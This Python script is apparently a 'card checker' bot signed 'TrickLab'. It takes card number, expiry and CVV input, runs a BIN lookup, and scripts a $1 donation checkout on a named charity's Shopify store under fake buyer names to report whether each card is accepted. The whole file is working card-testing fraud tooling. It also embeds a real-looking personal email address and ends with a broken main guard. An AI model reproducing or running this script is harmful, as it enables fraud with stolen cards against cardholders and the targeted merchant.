import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent, FakeUserAgentError
import re
import json
import time
import asyncio
import random
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - __main__ - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def find_between(s, first, last):
    """Extract a substring between two markers."""
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""

def parse_card(card_input: str):
    """Parse card details from input string."""
    try:
        cc_raw, mm, yy, cvc = card_input.strip().split("|")
        cc = " ".join(cc_raw[i:i+4] for i in range(0, len(cc_raw), 4))
        mm = str(int(mm))
        yy = "20" + yy if len(yy) == 2 else yy
        return cc, mm, yy, cvc
    except ValueError:
        return None, None, None, None

# Sample data
emails = ["nicochan275@gmail.com"]
first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]

async def sh(message):
    """Process payment using Shopify API."""
    start_time = time.time()
    logger.info("Starting payment process")
    text = message.strip()
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(pattern, text)

    if not match:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."

    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm = match.group(2)
    mm = str(int(mm))
    yy = match.group(3)
    yy = yy[2:] if len(yy) == 4 and yy.startswith("20") else yy
    cvc = match.group(4)
    full_card = f"{n}|{mm}|{yy}|{cvc}"

    # Initialize UserAgent with local file
    try:
        ua = UserAgent(path='user_agents.json')
    except FakeUserAgentError as e:
        logger.error(f"Error loading user agents: {e}")
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    user_agent = ua.random
    logger.info(f"Selected user agent: {user_agent}")
    remail = random.choice(emails)
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)
    logger.info(f"Selected buyer info: email={remail}, first={rfirst}, last={rlast}")

    async with aiohttp.ClientSession() as r:
        # BIN Lookup
        try:
            async with r.get(f'https://bins.antipublic.cc/bins/{n}') as res:
                if res.status == 200:
                    z = await res.json()
                    bin = z['bin']
                    bank = z['bank']
                    brand = z['brand']
                    type = z['type']
                    level = z['level']
                    country = z['country_name']
                    flag = z['country_flag']
                    currency = z['country_currencies'][0]
                    logger.info(f"BIN Lookup: {bin}, {bank}, {brand}, {type}, {level}, {country}, {currency}")
                else:
                    logger.error(f"BIN Lookup failed: Status {res.status}")
                    return "BIN Lookup failed: Invalid response"
        except Exception as e:
            logger.error(f"BIN Lookup failed: {str(e)}")
            return "BIN Lookup failed"

        # Step 1: Add to cart
        url = "https://www.buildingnewfoundations.com/cart/add.js"
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        data = {
            'form_type': 'product',
            'utf8': '✓',
            'id': '39555780771934',
            'quantity': '1',
            'product-id': '6630341279838',
            'section-id': 'product-template',
        }
        try:
            async with r.post(url, headers=headers, data=data) as response:
                if response.status != 200:
                    logger.error(f"Add to cart failed: Status {response.status}")
                    return "Failed to add to cart"
                logger.info("Successfully added to cart")
        except Exception as e:
            logger.error(f"Error adding to cart: {str(e)}")
            return "Failed to add to cart"

        # Step 2: Get cart token
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        try:
            async with r.get('https://www.buildingnewfoundations.com/cart.js', headers=headers) as response:
                raw = await response.text()
                res_json = json.loads(raw)
                tok = res_json['token']
                logger.info(f"Cart token: {tok}")
        except Exception as e:
            logger.error(f"Error getting cart token: {str(e)}")
            return "Failed to get cart token"

        # Step 3: Initiate checkout
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/cart',
            'user-agent': user_agent,
        }
        data = {
            'updates[]': '1',
            'checkout': 'Check out',
        }
        x = queue_token = stableid = paymentmethodidentifier = ""
        for attempt in range(3):  # Retry up to 3 times
            try:
                async with r.post('https://www.buildingnewfoundations.com/cart', headers=headers, data=data, allow_redirects=True) as response:
                    text = await response.text()
                    # Save full HTML to file
                    with open('checkout_response.html', 'w') as f:
                        f.write(text)
                    logger.info("Full checkout HTML saved to checkout_response.html")
                    logger.info(f"Checkout response HTML (first 1000 chars): {text[:1000]}")
                    logger.info(f"Final URL after redirects: {response.url}")
                    if response.status != 200:
                        logger.error(f"Checkout request failed: Status {response.status}")
                        return "Failed to initiate checkout: Invalid response"

                    # Try original find_between method
                    x = find_between(text, 'serialized-session-token" content=""', '""')
                    queue_token = find_between(text, '"queueToken":"', '"')
                    stableid = find_between(text, 'stableId":"', '"')
                    paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier":"', '"')

                    # Fallback with BeautifulSoup
                    soup = BeautifulSoup(text, 'html.parser')
                    if not all([x, queue_token, stableid, paymentmethodidentifier]):
                        logger.warning(f"Attempt {attempt + 1}: find_between failed, attempting BeautifulSoup parsing")
                        # Parse session_token
                        x = soup.find('meta', {'name': 'serialized-session-token'})['content'] if soup.find('meta', {'name': 'serialized-session-token'}) else x
                        # Try multiple input name variations
                        input_names = [
                            'queue_token', 'queueToken', 'QueueToken',
                            'stable_id', 'stableId', 'StableId',
                            'payment_method_identifier', 'paymentMethodIdentifier', 'PaymentMethodIdentifier'
                        ]
                        for name in input_names:
                            input_elem = soup.find('input', {'name': name})
                            if input_elem and input_elem.get('value'):
                                if 'queue' in name.lower():
                                    queue_token = input_elem['value']
                                elif 'stable' in name.lower():
                                    stableid = input_elem['value']
                                elif 'payment' in name.lower():
                                    paymentmethodidentifier = input_elem['value']
                                logger.info(f"Found input: {name}={input_elem['value']}")

                        # Log all inputs for debugging
                        inputs = soup.find_all('input')
                        logger.info(f"Found {len(inputs)} input elements: {[input.get('name') for input in inputs if input.get('name')]}")

                        # Log data attributes
                        data_attrs = soup.find_all(attrs={'data-queue-token': True}) + \
                                     soup.find_all(attrs={'data-stable-id': True}) + \
                                     soup.find_all(attrs={'data-payment-method-identifier': True})
                        for elem in data_attrs:
                            for attr, value in elem.attrs.items():
                                if 'queue-token' in attr:
                                    queue_token = value
                                    logger.info(f"Found data attribute: {attr}={value}")
                                elif 'stable-id' in attr:
                                    stableid = value
                                    logger.info(f"Found data attribute: {attr}={value}")
                                elif 'payment-method-identifier' in attr:
                                    paymentmethodidentifier = value
                                    logger.info(f"Found data attribute: {attr}={value}")

                        # Try parsing script tags for JSON data
                        if not all([queue_token, stableid, paymentmethodidentifier]):
                            logger.info("Input parsing failed, searching script tags")
                            scripts = soup.find_all('script')
                            potential_vars = ['checkout', 'checkoutConfig', 'shopifyCheckout', 'Checkout', 'window.ShopifyCheckout', 'window.checkoutData']
                            with open('script_tags.txt', 'w') as f:
                                for i, script in enumerate(scripts):
                                    if script.string:
                                        f.write(f"\n--- Script {i} ---\n{script.string}\n")
                                        logger.info(f"Script {i} content (first 200 chars): {script.string[:200]}")
                            for script in scripts:
                                if script.string:
                                    for var_name in potential_vars:
                                        try:
                                            json_match = re.search(rf'(?:var|const|let)\s*{var_name}\s*=\s*({{.*?}});', script.string, re.DOTALL)
                                            if json_match:
                                                checkout_data = json.loads(json_match.group(1))
                                                queue_token = checkout_data.get('queueToken', checkout_data.get('queue_token', queue_token))
                                                stableid = checkout_data.get('stableId', checkout_data.get('stable_id', stableid))
                                                paymentmethodidentifier = checkout_data.get('paymentMethodIdentifier', checkout_data.get('payment_method_identifier', paymentmethodidentifier))
                                                # Save JSON data to file
                                                with open('checkout_json.json', 'w') as f:
                                                    json.dump(checkout_data, f, indent=2)
                                                logger.info(f"Found in script (var {var_name}): queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
                                                logger.info("Checkout JSON saved to checkout_json.json")
                                                break
                                        except Exception as e:
                                            logger.error(f"Error parsing script tag for {var_name}: {str(e)}")

                    logger.info(f"Attempt {attempt + 1}: Checkout values: session_token={x}, queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
                    if all([x, queue_token, stableid, paymentmethodidentifier]):
                        break
                    logger.warning(f"Attempt {attempt + 1}: Missing values, retrying...")
                    await asyncio.sleep(1)  # Wait before retrying
            except Exception as e:
                logger.error(f"Attempt {attempt + 1}: Error initiating checkout: {str(e)}")
                if attempt == 2:
                    return "Failed to initiate checkout: " + str(e)
                await asyncio.sleep(1)
        else:
            logger.error("All retry attempts failed")
            return "Failed to initiate checkout: Missing values"

        logger.info(f"Final Checkout values: session_token={x}, queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
        if not all([x, queue_token, stableid, paymentmethodidentifier]):
            logger.error("One or more checkout values are missing")
            return "Failed to initiate checkout: Missing values"

        # Step 4: Create payment session
        headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'user-agent': user_agent,
        }
        json_data = {
            'credit_card': {
                'number': cc,
                'month': mm,
                'year': yy,
                'verification_value': cvc,
                'name': f'{rfirst} {rlast}',
            },
            'payment_session_scope': 'buildingnewfoundations.com',
        }
        try:
            async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data) as response:
                sid = (await response.json())['id']
                logger.info(f"Payment session ID: {sid}")
        except Exception as e:
            logger.error(f"Error creating payment session: {str(e)}")
            return "Failed to create payment session"

        # Step 5: Submit for completion
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/',
            'user-agent': user_agent,
            'x-checkout-one-session-token': x,
            'x-checkout-web-source-id': tok,
        }
        params = {'operationName': 'SubmitForCompletion'}
        json_data = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!]){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}__typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': x},
                    'queueToken': queue_token,
                    'delivery': {
                        'deliveryLines': [{'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}}}, 'targetMerchandiseLines': {'lines': [{'stableId': stableid}]}, 'deliveryMethodTypes': ['NONE']}],
                        'supportsSplitShipping': True,
                    },
                    'merchandise': {
                        'merchandiseLines': [{'stableId': stableid, 'merchandise': {'productVariantReference': {'id': 'gid://shopify/ProductVariantMerchandise/39555780771934'}}, 'quantity': {'items': {'value': 1}}}]
                    },
                    'payment': {
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': paymentmethodidentifier, 'sessionId': sid}}, 'amount': {'value': {'amount': '1', 'currencyCode': 'USD'}}}],
                        'billingAddress': {'streetAddress': {'address1': '127 Allen st', 'city': 'New York', 'countryCode': 'US', 'postalCode': '10002', 'firstName': rfirst, 'lastName': rlast}}
                    },
                    'buyerIdentity': {'email': remail, 'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}}
                },
                'attemptToken': tok,
                'metafields': []
            }
        }
        try:
            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
                text = await response.text()
                logger.info(f"SubmitForCompletion response: {text}")
                res_json = json.loads(text)
                elapsed_time = time.time() - start_time
                if 'errors' in res_json:
                    logger.error(f"GraphQL errors: {res_json['errors']}")
                    return f"""Card: {full_card}
Status: Failed❌
Response: GraphQL errors - {res_json['errors']}
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: TrickLab"""
                elif 'data' in res_json:
                    submit_result = res_json['data']['submitForCompletion']
                    if 'receipt' in submit_result:
                        rid = submit_result['receipt']['id']
                        logger.info(f"Successfully submitted for completion, receipt ID: {rid}")
                        return f"""Card: {full_card}
Status: Submitted✅
Response: Receipt ID {rid}
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: TrickLab"""
                    else:
                        logger.error(f"SubmitForCompletion failed: {submit_result}")
                        return f"""Card: {full_card}
Status: Failed❌
Response: {submit_result.get('reason', 'No receipt')}
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: TrickLab"""
                else:
                    logger.error("Unexpected response format")
                    return f"""Card: {full_card}
Status: Failed❌
Response: Unexpected response format
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: TrickLab"""
        except Exception as e:
            logger.error(f"Error submitting for completion: {str(e)}")
            elapsed_time = time.time() - start_time
            return f"""Card: {full_card}
Status: Failed❌
Response: {str(e)}
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: TrickLab"""

# Run the script
if __main__ == "__main__":
    ok = input("Card: ")
    print(asyncio.run(sh(ok)))
